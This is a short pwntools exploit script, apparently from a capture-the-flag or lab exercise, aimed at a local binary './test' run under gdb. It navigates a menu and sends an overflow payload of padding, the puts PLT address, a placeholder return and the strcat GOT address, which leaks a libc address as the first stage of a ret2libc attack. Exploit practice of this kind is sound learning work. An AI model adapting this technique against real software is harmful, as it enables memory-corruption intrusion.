from pwn import *

strcat_got = 0x0804a018
puts_plt =   0x08048745
p = gdb.debug('./test')

msg = p.recvlines(5)
print msg
msg = p.recvuntil(':')
print msg

p.sendline('1')
p.sendline("A"*48)
msg = p.recvuntil(':')
print msg
p.sendline("2")
print p.recvlines(2)
p.sendline("1")
payload = "B"*28+pack(puts_plt)+pack(0xdeadbeef)+pack(strcat_got)
p.sendline(payload)
msg = p.recvuntil(':')
print msg
p.sendline('4')

raw_input()
